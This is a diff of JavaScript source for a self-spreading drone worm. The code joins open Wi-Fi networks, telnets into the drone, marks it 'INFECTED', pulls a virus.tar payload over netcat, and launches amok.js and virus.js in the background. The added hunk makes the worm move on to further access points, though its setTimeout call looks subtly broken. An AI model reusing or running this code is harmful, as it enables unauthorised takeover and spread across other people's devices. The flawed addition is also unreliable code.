@@ -17,7 +17,7 @@ function attack () {
     else {
         withNodes(require('./nodes.json'));
     }
-    
+
     function withNodes (nodes) {
         var open = nodes.filter(function (node) {
             return node.encrypted === false;
@@ -35,7 +35,7 @@ function attack () {
         console.log(ap);
         console.log('==================================================');
         if (!ap) return setTimeout(attack, 5000);
-        
+
         iw.connect(ap.essid, function (err) {
             if (err) setTimeout(attack, 5000);
             else dhcp(function (err) {
@@ -45,26 +45,33 @@ function attack () {
                 }, 2000)
             })
         });
+
+        // Filter out the used ap
+        var open = nodes.filter(function (node) {
+            return node.essid !== ap.essid;
+        });
+
+        setTimeout(withNodes(open), 5000);
     }
 }
 
 function dhcp (cb) {
     var failed = false;
-    
+
     var to1;
     var to0 = setTimeout(function () {
         failed = true;
         if (to1) clearTimeout(to1);
         cb('timed out');
     }, 15 * 1000);
-    
+
     function retry () {
         if (failed) return;
-        
+
         var ps = spawn('dhclient', [ iw.iface ]);
         ps.on('exit', check);
     }
-    
+
     function check () {
         getAddr(function (addr) {
             if (/^192\.168\./.test(addr)) {
@@ -91,42 +98,42 @@ function telnet (addr) {
     s.pipe(process.stdout, { end : false });
     process.stdin.pipe(s);
     process.stdin.resume();
-    
+
     var pending = 1;
     s.on('data', function ondata (buf) {
         if (/THIS DRONE IS INFECTED/.test(buf)) {
             console.log('already infected');
             //s.destroy();
         }
-        
+
         String(buf).split('\n').forEach(function (line) {
             if (/\+ Done/.test(line)) {
                 pending --;
                 if (pending === 0) setTimeout(done, 2000);
             }
         });
-        
+
         function done () {
             s.removeListener('data', ondata);
             s.write('tar xf virus.tar\n');
-            
+
             setTimeout(function () {
                 s.write('../node amok.js &\n');
             }, 5 * 1000);
-            
+
             setTimeout(function () {
                 s.write('../node virus.js &\n');
             }, 10 * 1000);
         }
     });
-    
+
     s.on('connect', function () {
         s.write('cat /tmp/INFECTED\n');
         s.write('echo THIS DRONE ``IS INFECTED > /tmp/INFECTED\n');
-        
+
         s.write('mkdir -p /data/video/virus\n');
         s.write('cd /data/video/virus\n');
-        
+
         var port = 1000 + Math.floor(64536 * Math.random());
         s.write('nc -lp ' + port + ' > virus.tar &\n');
         setTimeout(function () {
